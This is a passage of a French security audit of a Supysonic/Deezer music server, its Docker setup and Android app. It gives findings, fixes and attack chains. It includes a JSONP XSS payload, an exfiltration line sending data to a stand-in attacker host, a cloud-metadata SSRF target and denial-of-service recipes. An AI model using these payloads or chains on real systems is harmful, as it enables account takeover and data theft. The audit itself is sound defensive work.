> Note : l'état est en mémoire du processus. C'est cohérent avec `workers = 1`, mais
> toute montée en charge (`GUNICORN_WORKERS=4`, documenté comme possible) **divise
> silencieusement la protection par 4**. À signaler dans la configuration gunicorn.

---

### <a id="ns-12"></a>NS-12 — 🟠 Sessions non révocables, pas de régénération

**Fichiers :** `supysonic/webui/__init__.py:951-970`, `supysonic/frontend/user.py:346-389`

```python
session["uid"] = str(user.id)
session.permanent = True        # ⇒ PERMANENT_SESSION_LIFETIME = 31 jours par défaut
```

* **Pas de `session.clear()` avant l'écriture** → fixation de session possible pour un
  attaquant capable de poser un cookie sur le domaine (sous-domaine voisin, MITM en
  HTTP — rendu plus probable par [NS-01](#ns-01)).
* **Les sessions Flask sont des cookies signés, donc non révocables.** Un cookie volé
  reste valide **31 jours**. Ni la déconnexion, ni le changement de mot de passe, ni la
  rétrogradation d'un admin ne l'invalident.
* La seule révocation possible est la rotation de `cookies_secret`, qui déconnecte tout
  le monde et n'est ni documentée ni outillée.

**Correctif.**

1. `session.clear()` **avant** d'écrire l'identité, dans les deux points de connexion.
2. Réduire `PERMANENT_SESSION_LIFETIME` (7 jours max ; 12 h pour l'interface d'admin).
3. Ajouter un `User.session_epoch` (entier), stocké dans la session à la connexion et
   comparé dans `login_required`. L'incrémenter au changement de mot de passe, à la
   modification des rôles et sur une action « déconnecter partout ». Coût : une colonne
   et deux lignes de code, et cela transforme des sessions non révocables en sessions
   révocables.

---

### <a id="ns-26"></a>NS-26 — 🟠 Création de threads non bornée

**Fichier :** `supysonic/webui/__init__.py:932-945`

```python
def _push_async(label, fn, *args):
    ...
    threading.Thread(target=run, name=f"deezer-{label}", daemon=True).start()
```

**Un thread OS par appel**, sans pool ni compteur. Les appelants sont des routes HTTP :
`PATCH /api/playlist/<id>` (renommage), `DELETE /api/playlist/<id>`,
`POST /api/podcast/progress` (appelée **périodiquement pendant la lecture** par chaque
client). Chaque thread lancé fait un aller-retour réseau vers Deezer, donc vit longtemps.

**PoC :** une boucle de `PATCH /api/playlist/<id>` (admin) ou, plus accessible, un
client qui envoie `POST /api/podcast/progress` en rafale depuis un compte admin →
milliers de threads → épuisement mémoire/descripteurs, puis `RuntimeError: can't start
new thread` et arrêt du processus.

**Correctif.** Remplacer par un `concurrent.futures.ThreadPoolExecutor(max_workers=4)`
partagé, avec une file bornée et un rejet silencieux (ces pushs sont déjà « best-effort »
par conception, donc les perdre est acceptable) :

```python
_push_pool = ThreadPoolExecutor(max_workers=4, thread_name_prefix="deezer-push")

def _push_async(label, fn, *args):
    if current_app.testing:
        ...  # inline, inchangé
    try:
        _push_pool.submit(_wrap(label, fn, *args))
    except RuntimeError:
        logger.debug("push pool saturé, %s abandonné", label)
```

Ajouter aussi un rate-limit sur `/api/podcast/progress` (une écriture DB par requête,
sans limite, est un vecteur d'écriture illimité pour tout compte).

---

## 4. Constats moyens

### <a id="ns-13"></a>NS-13 — 🟡 `changePassword` n'exige pas le mot de passe actuel

**Fichier :** `supysonic/api/user.py:76-88`

```python
@api_routing("/changePassword")
def user_changepass():
    username = request.values["username"]
    password = request.values["password"]
    if username != request.user.name and not request.user.admin:
        raise Forbidden()
    UserManager.change_password2(username, password)   # ← pas de vérification de l'ancien
```

C'est conforme au protocole Subsonic, mais cela signifie que **toute** compromission
d'une credential Subsonic (un jeton `t`/`s` capté dans un log, une URL partagée, un
`.har`) se transforme en prise de contrôle définitive du compte. L'interface web,
elle, exige bien le mot de passe actuel (`frontend/user.py:213`) — l'API est le maillon
faible.

**Correctif.** Exiger `oldPassword` quand `username == request.user.name` (les clients
qui ne l'envoient pas reçoivent une erreur explicite), ou rendre la route
admin-seulement via une option de configuration.

---

### <a id="ns-14"></a>NS-14 — 🟡 Credentials Subsonic en clair dans l'URL, jeton MD5

**Fichiers :** `supysonic/api/__init__.py:50-104`, `supysonic/managers/user.py:102-115`

Le protocole Subsonic accepte trois formes, toutes en **paramètres de requête** :

* `p=<mot de passe en clair>` ;
* `p=enc:<hex>` — un encodage hexadécimal, **pas** un chiffrement (`decode_password`) ;
* `t=md5(password+salt)&s=<salt>` — **MD5**, et le sel est choisi par le client.

Ces valeurs finissent dans les journaux d'accès nginx, l'historique du navigateur, les
en-têtes `Referer`, les proxies d'entreprise et les captures `.har`. Le code fait ce
qu'il peut (`hmac.compare_digest` pour la comparaison — bien), mais la conception du
protocole est le problème.

**Correctif.** Pas de correctif protocolaire possible, donc du durcissement :

* Documenter **très explicitement** que `/rest` ne doit être exposé qu'en HTTPS.
* Ajouter `[webapp] subsonic_require_https = yes` qui rejette en 403 toute requête
  `/rest` non chiffrée (en tenant compte de `X-Forwarded-Proto`).
* Ajouter une option pour **désactiver** `p=` en clair et n'accepter que `t`/`s`
  (ce qui évite au moins le mot de passe littéral dans les logs).
* Retirer les credentials des journaux applicatifs : `_record_auth_failure` journalise
  déjà le nom d'utilisateur en `error`, ce qui est correct, mais le serveur web en
  amont, lui, journalise l'URL complète.

---

### <a id="ns-15"></a>NS-15 — 🟡 JSONP : `callback` non validé → gadget de contournement CSP

**Fichier :** `supysonic/api/formatters.py:74-89`

```python
rv = f"{self.__callback}({json.dumps(rv)})"
rv.mimetype = "application/javascript"
```

Le `callback` est repris **tel quel**. `?f=jsonp&callback=alert(document.cookie);//`
produit du JavaScript arbitraire servi **depuis l'origine de confiance**, avec un type
MIME JavaScript.

Le `X-Content-Type-Options: nosniff` global empêche l'interprétation en HTML, donc ce
n'est pas un XSS direct. Mais la CSP de l'application est `script-src 'self'` : cet
endpoint est un **gadget qui permet à n'importe quelle injection de script d'échapper
à la CSP** (`<script src="/rest/ping.view?...&f=jsonp&callback=PAYLOAD">` est autorisé
par `'self'`). Il fournit aussi une page hébergeant du JS attaquant sur un domaine de
confiance, utile pour du phishing et pour contourner des filtres réseau.

Par ailleurs `JSONFormatter` ajoute `Access-Control-Allow-Origin: *` sur toutes les
réponses `/rest` : n'importe quel site peut les lire cross-origin. L'impact est limité
puisque `/rest` n'utilise pas de cookies (chaque requête porte ses credentials), mais
c'est une exposition gratuite.

**Correctif.**

```python
_CALLBACK_RE = re.compile(r"\A[A-Za-z_$][A-Za-z0-9_$]{0,63}\Z")

if not self.__callback or not _CALLBACK_RE.match(self.__callback):
    return jsonify(self._subsonicify("error", {"code": 10, "message": "Invalid callback"}))
```

Et préfixer la réponse d'un `/**/` (protection anti-JSON-hijacking historique), ou —
plus simple — ajouter une option pour désactiver complètement JSONP, qui n'a plus
d'usage légitime en 2026.

---

### <a id="ns-16"></a>NS-16 — 🟡 `getLyrics` : XML non fiable, en HTTP clair

**Fichier :** `supysonic/api/media.py:574-596`

```python
r = requests.get("http://api.chartlyrics.com/apiv1.asmx/SearchLyricDirect", ...)
root = ElementTree.fromstring(r.content)
```

* **HTTP en clair** → n'importe quel intermédiaire réseau contrôle la réponse.
* `xml.etree.ElementTree` est, d'après la documentation Python elle-même, vulnérable
  aux attaques d'**expansion d'entités** (« billion laughs », expansion quadratique).
  Une réponse MITM de quelques kilo-octets peut consommer plusieurs gigaoctets de RAM
  et faire tuer le worker par l'OOM killer.
* Le résultat est **mis en cache** (`cache_key = f"lyrics-{md5(...)}"`) : l'empoisonnement
  est persistant, et les paroles injectées sont ensuite servies à tous les clients.
* Un `NoneType` sur `root.find(...).text` (réponse inattendue) lève une `AttributeError`
  **non capturée** — seul `requests.exceptions.RequestException` l'est → 500.

C'est atténué par le fait que `online_lyrics` vaut `False` par défaut. Mais l'option
existe et est documentée.

**Correctif.** Passer en `https://`, ajouter `defusedxml` (ou basculer sur un service
JSON — `lyrics.py` utilise déjà LRCLIB en HTTPS et en JSON, qui fait le même travail en
mieux), borner `r.content` en taille avant parsing, et élargir le `except`.

---

### <a id="ns-17"></a>NS-17 — 🟡 Ids non validés injectés dans les URL Deezer sortantes

**Fichiers :** `supysonic/webui/__init__.py` (plusieurs routes), `deezerpy/api.py:36`

```python
result_json = self.session.get("https://api.deezer.com/" + method, params=args, ...)
# avec method = f'artist/{artist_id}'
```

Le helper `_valid_id()` existe et est bien utilisé sur `/api/stream`, `/api/favorite`,
`/api/download`… mais **pas** sur :

`/api/artist/<artist_id>` · `/api/artist/<id>/tracks` · `/api/artist/<id>/discography` ·
`/api/album/<album_id>` · `/api/playlist/<playlist_id>` · `/api/radio/artist/<artist_id>` ·
`/api/lyrics/<track_id>` · `/api/smarttracklist/<sid>`

Le segment d'URL est concaténé directement dans l'URL sortante. Le nom d'hôte reste
fixe (donc pas de SSRF vers un hôte arbitraire), mais un `%3F` (décodé en `?`) permet
d'**injecter des paramètres** dans la requête vers `api.deezer.com`, et l'ensemble
constitue une consommation de quota API pilotée par le client (des requêtes sortantes
non filtrées, comptabilisées sur le compte Deezer de l'admin, sans limite).

Par ailleurs, `_valid_id()` lui-même est laxiste (`webui/__init__.py:357-360`) :

```python
return value.lstrip("-").isdigit()
```

Vérifié : `"-5"`, `"١٢٣"` (chiffres arabo-indiens), `"٢"`, `"²"` (exposant) passent tous
le test. `str.isdigit()` accepte tout le catégoriel Unicode `Nd` **et** les exposants.

**Correctif.**

```python
_ID_RE = re.compile(r"\A[0-9]{1,20}\Z")

def _valid_id(value):
    return bool(_ID_RE.match(str(value or "")))
```

Et appliquer `_valid_id()` en tête de **toutes** les routes ci-dessus (retour 400 sinon).

---

### <a id="ns-18"></a>NS-18 — 🟡 SSRF via l'URL de flux des épisodes de podcast

**Fichier :** `supysonic/deezer/provider.py:231-255`

```python
with self.dz.session.get(url, headers=headers, stream=True,
                         timeout=(10, 120), allow_redirects=True) as resp:
```

`url` provient de `EPISODE_DIRECT_STREAM_URL`, c'est-à-dire de la réponse Deezer. Il
n'est validé ni sur le schéma, ni sur l'hôte, ni sur l'IP résolue, et **les redirections
sont suivies**. Le contenu est ensuite **archivé sur disque** puis servi par
`/api/stream/<uuid>` et `/api/share/file/<uuid>`.

C'est un SSRF « au second degré » : il faut qu'un upstream (Deezer, ou un hébergeur de
podcast atteint via une redirection) renvoie une URL interne. Ce n'est pas hypothétique :
les flux de podcasts sont des URL tierces arbitraires, et une chaîne de redirections
vers `http://169.254.169.254/latest/meta-data/iam/…` ou `http://127.0.0.1:5722/…`
donnerait une **exfiltration lisible** via l'endpoint de streaming.

Le même schéma s'applique à la récupération de pochettes côté Android
(`PlayerService` télécharge `meta.cover` avec `Ssl.apply(conn, verifySsl)`).

**Correctif.** Un adaptateur `requests` qui refuse les IP non publiques :

```python
import ipaddress, socket
from urllib.parse import urlparse

def _assert_public(url):
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        raise DeezerError("schéma refusé")
    for *_ , sockaddr in socket.getaddrinfo(p.hostname, None):
        ip = ipaddress.ip_address(sockaddr[0])
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            raise DeezerError(f"cible interne refusée: {ip}")
```

Appliqué **à chaque saut** de redirection (`allow_redirects=False` + boucle manuelle),
sinon le contrôle est contournable par redirection. Borner aussi la taille téléchargée.

---

### <a id="ns-19"></a>NS-19 — 🟡 Android : clair, trust-all SSL, pont JS exposé

**Fichiers :** `android/app/src/main/AndroidManifest.xml:19`,
`Ssl.kt`, `MainActivity.kt:109-157, 123, 138-139, 429-446`

| Point | Détail |
|---|---|
| `android:usesCleartextTraffic="true"` | Autorise le HTTP en clair pour toute l'application. Le cookie de session et les credentials transitent en clair sur le Wi-Fi. |
| `Ssl.trustAll` + `hostnameVerifier { _, _ -> true }` | `X509TrustManager` qui n'implémente **rien**. Sur `verifySsl=false`, plus aucune authentification du serveur. |
| `onReceivedSslError → handler.proceed()` | Le WebView accepte n'importe quel certificat. Une case à cocher suffit à supprimer TLS. |
| `MIXED_CONTENT_ALWAYS_ALLOW` | Contenu HTTP injecté dans une page HTTPS. |
| `addJavascriptInterface(Bridge(), "NSNative")` | Pont natif exposé au JavaScript de la page. |
| `addDocumentStartJavaScript(webView, shimJs, setOf("*"))` | Le shim est injecté sur **toutes** les origines. |
| `android:allowBackup="true"` | Les préférences et les cookies sortent par `adb backup` sur les appareils qui le permettent. |

**Chaîne d'attaque « café Wi-Fi ».** L'utilisateur a coché « ne pas vérifier SSL » (le
cas nominal d'un certificat auto-signé, activement encouragé par l'écran de
configuration) ou utilise `http://`. L'attaquant sur le même réseau :

1. intercepte le trafic (aucune validation de certificat) → **lit le cookie de session
   directement** (`HttpOnly` ne protège que du JS, pas du réseau) ;
2. injecte du JavaScript dans `/app/index.html` → il s'exécute sur l'origine de
   confiance, avec accès à `window.NSNative` ;
3. `NSNative.shareFile(url)` accepte **n'importe quelle URL** : téléchargement arbitraire
   depuis l'appareil, écriture dans `cacheDir/shared`, ouverture d'un sélecteur de
   partage ;
4. `NSNative.saveText(name, text)` écrit un fichier arbitraire dans `Downloads`
   (le nom est assaini, le contenu ne l'est pas) ;
5. il possède le compte, et via l'admin toute la bibliothèque + l'ARL.

**Correctif.**

1. Retirer `usesCleartextTraffic="true"` et le remplacer par une **configuration de
   sécurité réseau** (`network_security_config.xml`) qui n'autorise le clair que pour
   l'hôte configuré, et de préférence uniquement en RFC1918.
2. Remplacer « ne pas vérifier SSL » par un **épinglage de certificat au premier usage**
   (TOFU) : à la configuration, présenter l'empreinte SHA-256 du certificat à
   l'utilisateur et l'enregistrer ; les connexions suivantes valident contre cette
   empreinte. On garde le support de l'auto-signé **sans** perdre l'authentification.
   Le trust-all actuel est strictement pire qu'aucun TLS, car il affiche un cadenas.
3. Restreindre l'injection du shim à l'origine configurée :
   `setOf(prefs.baseUrl())` au lieu de `setOf("*")`.
4. Valider les entrées du pont : `shareFile` doit **rejeter toute URL** dont l'origine
   ne correspond pas à `prefs.baseUrl()`.
5. `android:allowBackup="false"` (ou des règles d'extraction excluant les préférences).
6. Ajouter un avertissement explicite dans l'écran de configuration : « désactiver la
   vérification SSL expose votre mot de passe et votre bibliothèque sur les réseaux non
   fiables ».

---

### <a id="ns-20"></a>NS-20 — 🟡 Fuite de l'ARL et du mot de passe admin

**Fichiers :** `docker/entrypoint.sh`, `docker-compose.yml`, `.env.example`

L'ARL est **une credential de compte Deezer complète** — le projet le dit lui-même
(`CLAUDE.md` : « traitez-le comme un mot de passe »). Or :

| Vecteur | Détail |
|---|---|
| `render_config()` écrit `arl = $DEEZER_ARL` dans `/data/supysonic.conf` | En clair, avec l'umask par défaut (`0022` → lisible par tous dans le conteneur) et **sur un volume persistant** qui finit dans les sauvegardes. |
| `DEEZER_ARL` en variable d'environnement | Visible via `docker inspect`, `/proc/<pid>/environ`, et dans tout vidage mémoire ou rapport de crash. |
| `supysonic-cli user add "$USER" -p "$PASSWORD"` | Le **mot de passe admin apparaît dans la table des processus** (`ps aux`) pendant l'exécution. |
| `.env` | Correctement gitignoré ✅ — mais rien n'empêche un `docker compose config` de tout afficher. |
| Aucune rotation | Rien ne détecte ni ne signale un ARL expiré/compromis ; `relogin()` échoue silencieusement. |

**Correctif.**

* `chmod 600` sur `$CONF` juste après l'écriture, et `umask 077` en tête de
  l'entrypoint.
* Supporter les **secrets Docker** (`DEEZER_ARL_FILE=/run/secrets/deezer_arl`) et les
  privilégier dans la documentation ; `unset DEEZER_ARL` après le rendu de la config.
* Remplacer `-p "$PASSWORD"` par une lecture sur `stdin` (`printf '%s' "$PWD" | supysonic-cli user add … --password-stdin`).
* Ajouter `supysonic-cli deezer rotate-arl` et un journal explicite quand le login ARL
  échoue.
* Vérifier que l'ARL n'est **jamais** journalisé : `logger.info("Deezer login OK as %s")`
  est correct aujourd'hui, mais `exc_info=True` sur une exception `requests` peut
  inclure des cookies dans certaines traces.

---

### <a id="ns-21"></a>NS-21 — 🟡 Chaîne d'approvisionnement : builds non reproductibles

**Fichiers :** `.gitignore`, `webapp/package.json`, `setup.cfg`, `Dockerfile`

* **`webapp/package-lock.json` est gitignoré.** Le `npm install` du Dockerfile résout
  donc les plages `^` **au moment du build** : `svelte ^5.56.3`, `vite ^7.3.5`,
  `svelte-dnd-action ^0.9.70`, `svelte-spa-router ^5.1.0` et **toutes leurs dépendances
  transitives**. Une compromission de n'importe quel paquet en aval se retrouve dans
  l'image au prochain build, sans qu'aucun diff Git ne le montre. C'est précisément le
  scénario `event-stream`/`ua-parser-js`.
* **Plancher de version dangereux côté Python :** `flask >=0.11` (2016),
  `requests >=1.0.0` (2013), `peewee` et `mediafile` sans borne. Une installation
  `pip install .` sur un environnement existant peut satisfaire ces contraintes avec des
  versions criblées de CVE.
* Pas de `pip install --require-hashes`, pas d'épinglage d'image de base par digest
  (`python:3.13-slim` est un tag mutable).
* Le workflow Android génère un **keystore éphémère** quand les secrets ne sont pas
  définis : chaque build a une signature différente, ce qui rend impossible de
  distinguer une mise à jour légitime d'un APK malveillant.

**Correctif.**

1. **Committer `webapp/package-lock.json`** (retirer la ligne du `.gitignore`) et
   utiliser `npm ci` au lieu de `npm install` dans le Dockerfile.
2. Ajouter des planchers de sécurité : `flask >=3.0`, `requests >=2.32`, `Pillow >=10.3`.
3. Épingler l'image de base par digest et activer Dependabot / `npm audit` en CI.
4. Documenter que la signature stable de l'APK exige les secrets de dépôt, et publier
   l'empreinte de la clé dans le README.

---

### <a id="ns-22"></a>NS-22 — 🟡 CSP trop permissive, en-têtes manquants

**Fichier :** `supysonic/web.py:134-153`

```
img-src 'self' data: https:;  media-src 'self' blob: https:;  connect-src 'self' https:;
```

`https:` est un joker sur **tout Internet en HTTPS**. En cas d'injection (voir
[NS-15](#ns-15) pour le gadget), l'exfiltration est triviale :
`new Image().src = "https://attaquant.exemple/?d=" + btoa(donnees)` — autorisée par
`img-src https:` **et** par `connect-src https:`.

Manquent également : `object-src 'none'`, `Strict-Transport-Security`,
`Permissions-Policy`, `Cross-Origin-Opener-Policy`.

**Correctif.** Restreindre aux origines réellement utilisées (les images Deezer sortent
de `*.dzcdn.net` et `api.deezer.com`) :

```python
csp = (
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data: https://*.dzcdn.net https://api.deezer.com; "
    "media-src 'self' blob:; connect-src 'self'; font-src 'self' data:; "
    "object-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'"
)
```

Note : `/api/cover/<id>` proxifie déjà les pochettes en same-origin — `img-src https:`
n'est donc probablement même plus nécessaire. Ajouter HSTS conditionnellement à
`request.is_secure`.

---

### <a id="ns-23"></a>NS-23 — 🟡 Erreurs 500 non gérées un peu partout

Des conversions non protégées transforment une entrée malformée en exception, donc en
500 (et en trace dans les journaux) :

| Emplacement | Entrée |
|---|---|
| `api/media.py:184` | `int(maxBitRate)` — `?maxBitRate=abc` |
| `api/media.py:495` | `int(size)` — `getCoverArt?size=abc` |
| `api/jukebox.py:52,60` | `uuid.UUID(i)`, `int(index)`, `float(gain)` |
| `api/chat.py:17` | `int(since)` |
| `api/search.py:25-27` | `int(count)`, `int(offset)`, `int(newerThan)` |
| `api/__init__.py:88,108` | `request.values["u"]` / `["c"]` absent → `BadRequestKeyError` (400 HTML, pas une erreur Subsonic) |
| `cache.py:98` | `ValueError` sur clé invalide → 500 (voir [NS-36](#ns-36)) |

Aucun n'est une faille en soi (DEBUG est à `False`), mais l'ensemble constitue une
surface de bruit et de dégradation exploitable en boucle, et masque les vraies anomalies
dans les journaux.

**Correctif.** Un helper `_int_arg(name, default, lo, hi)` réutilisé partout, et un
`@api.errorhandler(Exception)` qui renvoie une erreur Subsonic bien formée plutôt qu'une
page d'erreur Werkzeug.

---

### <a id="ns-24"></a>NS-24 — 🟡 `addChatMessage` : écriture illimitée en base

**Fichier :** `supysonic/api/chat.py:28-33`

```python
msg = request.values["message"]
ChatMessage.create(user=request.user, message=msg)
```

Aucune limite de longueur, aucun rate-limit, aucune purge. Un compte invité remplit la
table (et donc le disque) en boucle. Le message est stocké brut et servi tel quel : les
clients Subsonic tiers qui l'affichent en HTML héritent d'un XSS stocké.

**Correctif.** Tronquer à ~512 caractères, limiter à N messages/minute/utilisateur,
purger les messages de plus de X jours, et échapper à l'affichage.

---

### <a id="ns-25"></a>NS-25 — 🟡 `Content-Disposition` construit depuis des tags utilisateur

**Fichier :** `supysonic/api/media.py:391`

```python
resp.headers["Content-Disposition"] = f"attachment; filename={rv.name}.zip"
```

`rv.name` est un nom d'album ou de dossier — donc, pour un fichier uploadé, une valeur
**contrôlée par l'utilisateur** via les tags ID3/Vorbis. Sans guillemets ni échappement :
un nom contenant `;`, `"` ou une double extension (`facture.pdf`) produit un en-tête
trompeur. Werkzeug refuse les retours à la ligne (donc pas d'injection d'en-tête
complète), mais le nom de fichier proposé à la victime est manipulable.

`webui/export.py:388-392` fait ça correctement (repli ASCII + `filename*=UTF-8''…`) :
c'est le modèle à reprendre.

**Correctif.** Utiliser `send_file(..., download_name=...)` de Flask, qui gère
l'échappement et RFC 5987, ou copier la logique de `export.py`.

---

### <a id="ns-27"></a>NS-27 — 🟡 Aucun journal d'audit des actions d'administration

Les échecs de connexion sont journalisés (`logger.error`), et c'est tout. Ne laissent
**aucune trace** : la création/suppression d'un utilisateur, l'attribution du rôle admin,
l'ajout d'un dossier racine, le changement de mot de passe d'un tiers, le changement de
quota, la suppression d'une playlist, et l'accès à un fichier appartenant à un autre
utilisateur.

Après un incident, il est donc **impossible** de reconstituer ce qui s'est passé — ce
qui est particulièrement gênant vu les chaînes CSRF décrites plus haut, dont toute la
signature serait « l'admin a fait ça lui-même ».

**Correctif.** Une table `AuditLog(user, action, target, ip, timestamp, details)` et un
helper `audit("user.create", target=name)` appelé sur toutes les mutations privilégiées.
Exposer les N dernières entrées dans l'interface d'admin.

---

## 5. Constats faibles et durcissement

### <a id="ns-28"></a>NS-28 — 🔵 Mots de passe par défaut
`.env.example` : `SUPYSONIC_ADMIN_PASSWORD=changeme`, `POSTGRES_PASSWORD=supysonic`.
`docker-compose.yml` utilise `${POSTGRES_PASSWORD:-supysonic}` — donc **le défaut
s'applique silencieusement** si la variable n'est pas définie, et le port 5722 est publié
sur `0.0.0.0`. → Refuser de démarrer si le mot de passe admin vaut `changeme` ; générer
un mot de passe aléatoire au premier boot et l'afficher une fois dans les journaux.

### <a id="ns-29"></a>NS-29 — 🔵 Aucune politique de mot de passe
`UserManager.add` accepte `"a"`. Aucune longueur minimale, aucune vérification contre
une liste de mots de passe compromis. → Minimum 12 caractères, refus des mots de passe
les plus courants (une liste de 10 000 entrées suffit).

### <a id="ns-30"></a>NS-30 — 🔵 `LIKE` non échappé
`Track.title.contains(query)` (peewee → `LIKE %…%`) n'échappe ni `%` ni `_`.
`/rest/search?any=%` ou `/api/search?q=_` déclenche un balayage complet de table sur
chaque colonne, sans index utilisable. Sur une bibliothèque de 100 000 pistes c'est un
DoS base de données à une requête. → Échapper `% _ \` et exiger 2 caractères minimum.

### <a id="ns-31"></a>NS-31 — 🔵 Bombes de décompression PIL
`api/media.py:503,507` ouvre avec Pillow des images provenant de fichiers **uploadés par
les utilisateurs** (pochettes embarquées). Pillow avertit au-delà de 89 Mpx et lève
au-delà du double, mais la limite est franchissable en volume. `getCoverArt?size=` n'est
pas borné non plus. → `Image.MAX_IMAGE_PIXELS` explicite, `size` borné à [16, 2048].

### <a id="ns-32"></a>NS-32 — 🔵 `IniConfig` injecte des sections inconnues dans `app.config`
`config.py:130-137` : toute section inconnue devient un attribut en MAJUSCULES, repris
par `app.config.from_object()`. Une section `[secret_key]` écraserait `SECRET_KEY` par
un dictionnaire. De plus, `getattr(self, section).update(options)` mute les dictionnaires
**de classe** de `DefaultConfig` — un état global partagé entre instances, source de
fuites entre tests et entre applications dans un même processus. → Copier les dicts dans
`__init__` et n'accepter qu'une liste blanche de sections.

### <a id="ns-33"></a>NS-33 — 🔵 Croissance non bornée des tables de lecture
`_MAX_MARKERS = 100` borne les marqueurs **par épisode et par utilisateur**, mais le
nombre d'épisodes n'est pas borné. `PodcastProgress` accepte une écriture par requête
sans limite. → Plafond global par utilisateur + rate-limit (voir [NS-26](#ns-26)).

### <a id="ns-34"></a>NS-34 — 🔵 `_valid_id()` trop laxiste
Traité en détail dans [NS-17](#ns-17).

### <a id="ns-35"></a>NS-35 — 🔵 Le catalogue Deezer payant est ouvert à tous les invités
Le cloisonnement admin/invité est soigné pour les **données personnelles** (Flow,
favoris, recommandations, playlists) — c'est bien pensé. Mais `/api/search`,
`/api/album/<id>`, `/api/stream/<id>`, `/api/download` et `/api/export` donnent à
**tout** compte invité l'accès complet au catalogue via l'abonnement de l'admin, en
FLAC et en téléchargement de masse. Ce n'est pas une faille technique, c'est un risque
**contractuel** (bannissement du compte Deezer, responsabilité de l'hébergeur). → Une
option `[deezer] guest_streaming = no` et un plafond de téléchargements par invité.

### <a id="ns-36"></a>NS-36 — 🔵 `Cache._filepath` lève `ValueError` → 500
`cache.py:86-99` valide correctement les clés (**la traversée de répertoire est bien
bloquée** ✅) mais lève une `ValueError` non capturée. Le format issu de `ClientPrefs`
(paramétrable par l'utilisateur en `POST /user/<uid>`) n'est **pas** validé par la regex
qui protège le paramètre `format` de la requête (`api/media.py:160`) — il atteint donc
la clé de cache et provoque un 500 sur chaque lecture. → Valider `prefs.format` à
l'écriture avec la même regex `[a-z0-9]{1,8}`, et convertir la `ValueError` en 400.

---

## 6. Chaînes d'attaque

### Chaîne A — Du visiteur anonyme au contrôle total du serveur

```
1. L'attaquant envoie à l'admin un lien (forum, mail, message) vers sa page.
2. L'admin est connecté à /  (cookie de 31 jours, NS-12).
3. La page auto-soumet POST /user/add  →  SameSite jamais posé (NS-01),
   aucun jeton CSRF (NS-02), mass assignment admin=1 (NS-05).
   ⇒ l'attaquant a un compte ADMINISTRATEUR.
4. POST /folder/add avec path=/            (aucune restriction de chemin, NS-06)
5. GET /rest/download?id=<N>               (ZIP récursif sans filtre, NS-06)
   ⇒ /data/supysonic.conf → l'ARL Deezer (NS-20)
   ⇒ la base → Meta.password_secret → TOUS les mots de passe en clair (NS-03)
   ⇒ la base → Meta.cookies_secret → forge de session
   ⇒ la base → Meta.daemon_key → pickle → RCE sur l'hôte du démon (NS-04)
```

**Coût pour l'attaquant :** une page HTML et un clic. **Aucune faille mémoire, aucun
0-day, aucun outil.**

### Chaîne B — De l'invité au serveur hors service

```
1. Compte invité (créé légitimement, ou obtenu par la chaîne A).
2. Boucle POST /api/download avec 2000 ids  →  file non bornée (NS-08)
   ⇒ 4 workers archivent des FLAC en continu → disque plein
3. En parallèle : 8× GET /api/share/waveform  →  ffmpeg synchrone (NS-09)
   ⇒ les 8 threads gunicorn sont pris, le serveur ne répond plus
4. En parallèle : POST /api/podcast/progress en rafale  →  threads non bornés (NS-26)
   ⇒ RuntimeError: can't start new thread → le processus meurt
5. Disque plein ⇒ SQLite corrompue, cache de transcodage inutilisable.
```

### Chaîne C — Le voisin de Wi-Fi

```
1. L'utilisateur a coché « ne pas vérifier SSL » (auto-signé) ou utilise http:// (NS-19).
2. MITM sur le réseau : le certificat n'est plus vérifié du tout.
3. Le cookie de session part en clair (SESSION_COOKIE_SECURE inopérant, NS-01).
4. Injection de JS dans /app  →  accès à window.NSNative (pont exposé, NS-19)
   ⇒ shareFile(url arbitraire), saveText(fichier arbitraire dans Downloads)
5. Le cookie volé reste valide 31 jours ; changer le mot de passe ne le révoque pas (NS-12).
```

### Chaîne D — La sauvegarde oubliée

```
Un dump SQL / un volume Docker / un snapshot qui fuit :
  Meta.password_secret  → déchiffrement de password_clear → TOUS les mots de passe
                          en clair → réutilisation sur les autres services des victimes
  Meta.cookies_secret   → forge du cookie de session admin, sans mot de passe
  Meta.daemon_key       → pickle → RCE
  la config à côté      → l'ARL Deezer
```

C'est le constat le plus important à retenir de cet audit : **il n'y a aucune
défense en profondeur derrière la base de données.** Sortir les trois clés vers des
variables d'environnement (NS-03) casse cette chaîne à elle seule.

---

## 7. Ce qui est déjà bien fait

Un audit honnête doit dire aussi ce qui tient. Ces points sont solides et méritent des
tests de non-régression pour ne pas se perdre :

* **Traversée de répertoire : correctement traitée partout.** `Cache._filepath` (rejet
  des séparateurs et de `..`), `library.sanitize()` (`..` → `untitled`),
  `_safe_upload_name()` (gestion Unicode + suppression des séparateurs, avec en prime
  une vérification « ceinture et bretelles » du répertoire de destination), et
  `send_from_directory` dans `spa.py`. C'est du bon travail, y compris le raisonnement
  documenté sur `secure_filename` qui détruit les noms non latins.
* **Hachage de mot de passe :** argon2id avec migration transparente des vieux SHA1, et
  `hmac.compare_digest` pour les comparaisons. (Gâché par `password_clear`, mais la
  mécanique est correcte.)
* **Pas d'injection SQL :** peewee est utilisé en ORM partout, aucune requête construite
  par concaténation.
* **Pas de XSS côté SPA :** Svelte échappe par défaut, aucun `{@html}`, aucun
  `innerHTML`. Les templates Jinja n'utilisent aucun `|safe`.
* **Pas d'injection de commande :** tous les appels `subprocess` passent une **liste**
  d'arguments, jamais `shell=True`. Les substitutions de `prepare_transcoding_cmdline`
  se font *à l'intérieur* d'arguments déjà découpés par `shlex.split`, donc les
  métadonnées ne peuvent pas ajouter d'arguments.
* **Cloisonnement des données personnelles Deezer :** le raisonnement admin/invité de
  `webui/__init__.py:320-340` est explicite, documenté et appliqué avec constance sur
  Flow, favoris, recommandations et playlists.
* **Le journal de diagnostic client rédige les secrets** (`SECRET_PARAMS` dans
  `log.js`) et ne capture jamais les corps de requête. C'est une attention rare.
* **Robustesse des sous-processus :** `stderr` redirigé vers `DEVNULL` pour éviter les
  interblocages sur tube plein, `proc.kill()` sur `GeneratorExit`. Bien vu.
* **`ProxyFix` est opt-in** avec un commentaire qui explique exactement pourquoi. C'est
  le bon défaut.

---

## 8. Plan d'action proposé

### Immédiat (à faire aujourd'hui — une poignée de lignes chacun)

- [ ] **NS-01** — `app.config[...] = ...` au lieu de `setdefault`, + test sur l'en-tête `Set-Cookie`
